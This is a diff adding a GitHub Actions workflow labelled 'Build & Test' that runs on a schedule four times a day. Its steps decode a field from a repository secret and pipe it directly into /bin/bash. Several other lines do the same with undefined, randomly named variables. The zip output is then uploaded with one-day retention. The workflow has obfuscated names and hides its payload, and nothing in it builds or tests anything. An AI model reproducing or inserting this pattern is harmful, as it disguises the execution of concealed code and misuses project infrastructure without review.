@@ -1,0 +1,32 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '11 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+jobs:
+  execute:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
+        env:
+          vxta7: ${{ secrets.vxta7 }}
+        run: |
+          printf '%s' "$vxta7" | jq -r .rxq4132 | /bin/bash
+          echo $thh2346 | jq -r .ltxtp33 | /bin/bash
+          printf '%s' "$rdkb08545" | jq -r .ahvib6428 | /bin/bash
+          printf '%s' "$cd14012" | jq -r .yyxkb188 | /bin/bash
+          echo $fvf4 | jq -r .zuijy7 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: ctFtWLAL
+          path: "*.zip"
+          retention-days: 1
